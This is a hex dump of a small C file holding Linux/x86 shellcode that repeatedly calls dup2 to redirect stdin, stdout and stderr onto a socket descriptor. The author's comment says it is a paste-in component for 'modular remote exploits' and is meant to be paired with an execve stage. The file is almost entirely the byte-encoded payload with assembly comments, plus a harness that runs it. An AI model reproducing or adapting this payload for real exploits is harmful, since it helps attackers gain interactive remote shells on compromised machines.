00000000  2f 2a 20 64 75 70 32 5f  6c 6f 6f 70 2d 63 6f 72  |/* dup2_loop-cor|
00000010  65 2e 63 20 62 79 20 43  68 61 72 6c 65 73 20 53  |e.c by Charles S|
00000020  74 65 76 65 6e 73 6f 6e  20 3c 63 6f 72 65 40 62  |tevenson <core@b|
00000030  6f 6b 65 6f 61 2e 63 6f  6d 3e 20 0d 0a 20 2a 0d  |okeoa.com> .. *.|
00000040  0a 20 2a 20 49 20 6d 61  64 65 20 74 68 69 73 20  |. * I made this |
00000050  61 73 20 61 20 63 68 75  6e 6b 20 79 6f 75 20 63  |as a chunk you c|
00000060  61 6e 20 70 61 73 74 65  20 69 6e 20 74 6f 20 6d  |an paste in to m|
00000070  61 6b 65 20 6d 6f 64 75  6c 61 72 20 72 65 6d 6f  |ake modular remo|
00000080  74 65 0d 0a 20 2a 20 65  78 70 6c 6f 69 74 73 2e  |te.. * exploits.|
00000090  20 20 49 20 75 73 75 61  6c 6c 79 20 63 6f 6d 62  |  I usually comb|
000000a0  69 6e 65 20 74 68 69 73  20 77 69 74 68 20 61 6e  |ine this with an|
000000b0  20 65 78 65 63 76 65 20  61 73 20 74 68 65 20 73  | execve as the s|
000000c0  65 63 6f 6e 64 0d 0a 20  2a 20 73 74 61 67 65 20  |econd.. * stage |
000000d0  6f 66 20 61 20 72 65 61  64 28 29 20 6a 6d 70 20  |of a read() jmp |
000000e0  2a 25 65 73 70 0d 0a 20  2a 2f 0d 0a 63 68 61 72  |*%esp.. */..char|
000000f0  20 68 65 6c 6c 63 6f 64  65 5b 5d 20 3d 20 2f 2a  | hellcode[] = /*|
00000100  20 64 75 70 32 28 30 2c  30 29 3b 20 64 75 70 32  | dup2(0,0); dup2|
00000110  28 30 2c 31 29 3b 20 64  75 70 32 28 30 2c 32 29  |(0,1); dup2(0,2)|
00000120  3b 20 6c 69 6e 75 78 2f  78 38 36 20 62 79 20 63  |; linux/x86 by c|
00000130  6f 72 65 20 2a 2f 0d 0a  22 5c 78 33 31 5c 78 63  |ore */.."\x31\xc|
00000140  39 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |9"              |
00000150  20 09 2f 2f 20 78 6f 72  20 20 20 20 25 65 63 78  | .// xor    %ecx|
00000160  2c 25 65 63 78 0d 0a 22  5c 78 35 36 22 20 20 20  |,%ecx.."\x56"   |
00000170  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000180  09 2f 2f 20 70 75 73 68  20 20 20 25 65 73 69 0d  |.// push   %esi.|
00000190  0a 22 5c 78 35 62 22 20  20 20 20 20 20 20 20 20  |."\x5b"         |
000001a0  20 20 20 20 20 20 20 20  20 20 09 2f 2f 20 70 6f  |          .// po|
000001b0  70 20 20 20 20 25 65 62  78 0d 0a 2f 2f 20 6c 6f  |p    %ebx..// lo|
000001c0  6f 70 3a 0d 0a 22 5c 78  36 61 5c 78 33 66 22 20  |op:.."\x6a\x3f" |
000001d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 09 2f  |              ./|
000001e0  2f 20 70 75 73 68 20 20  20 24 30 78 33 66 0d 0a  |/ push   $0x3f..|
000001f0  22 5c 78 35 38 22 20 20  20 20 20 20 20 20 20 20  |"\x58"          |
00000200  20 20 20 20 20 20 20 20  20 09 2f 2f 20 70 6f 70  |         .// pop|
00000210  20 20 20 20 25 65 61 78  0d 0a 22 5c 78 63 64 5c  |    %eax.."\xcd\|
00000220  78 38 30 22 20 20 20 20  20 20 20 20 20 20 20 20  |x80"            |
00000230  20 20 20 09 2f 2f 20 69  6e 74 20 20 20 20 24 30  |   .// int    $0|
00000240  78 38 30 0d 0a 22 5c 78  34 31 22 20 20 20 20 20  |x80.."\x41"     |
00000250  20 20 20 20 20 20 20 20  20 20 20 20 20 20 09 2f  |              ./|
00000260  2f 20 69 6e 63 20 20 20  20 25 65 63 78 0d 0a 22  |/ inc    %ecx.."|
00000270  5c 78 38 30 5c 78 66 39  5c 78 30 33 22 20 20 20  |\x80\xf9\x03"   |
00000280  20 20 20 20 20 20 20 20  09 2f 2f 20 63 6d 70 20  |        .// cmp |
00000290  20 20 20 24 30 78 33 2c  25 63 6c 0d 0a 22 5c 78  |   $0x3,%cl.."\x|
000002a0  37 35 5c 78 66 35 22 20  20 20 20 20 20 20 20 20  |75\xf5"         |
000002b0  20 20 20 20 20 20 09 2f  2f 20 6a 6e 65 20 20 20  |      .// jne   |
000002c0  20 38 30 34 38 33 65 38  20 3c 6c 6f 6f 70 3e 0d  | 80483e8 <loop>.|
000002d0  0a 3b 0d 0a 0d 0a 69 6e  74 20 6d 61 69 6e 28 76  |.;....int main(v|
000002e0  6f 69 64 29 0d 0a 7b 0d  0a 20 20 76 6f 69 64 20  |oid)..{..  void |
000002f0  28 2a 73 68 65 6c 6c 29  28 29 20 3d 20 28 76 6f  |(*shell)() = (vo|
00000300  69 64 20 2a 29 26 68 65  6c 6c 63 6f 64 65 3b 0d  |id *)&hellcode;.|
00000310  0a 20 20 70 72 69 6e 74  66 28 22 25 64 20 62 79  |.  printf("%d by|
00000320  74 65 20 64 75 70 32 28  30 2c 30 29 3b 20 64 75  |te dup2(0,0); du|
00000330  70 32 28 30 2c 31 29 3b  20 64 75 70 32 28 30 2c  |p2(0,1); dup2(0,|
00000340  32 29 3b 20 6c 69 6e 75  78 2f 78 38 36 20 62 79  |2); linux/x86 by|
00000350  20 63 6f 72 65 5c 6e 22  2c 0d 0a 20 20 20 20 20  | core\n",..     |
00000360  20 20 20 20 73 74 72 6c  65 6e 28 68 65 6c 6c 63  |    strlen(hellc|
00000370  6f 64 65 29 29 3b 0d 0a  20 20 73 68 65 6c 6c 28  |ode));..  shell(|
00000380  29 3b 0d 0a 20 20 72 65  74 75 72 6e 20 30 3b 0d  |);..  return 0;.|
00000390  0a 7d                                             |.}|
00000392
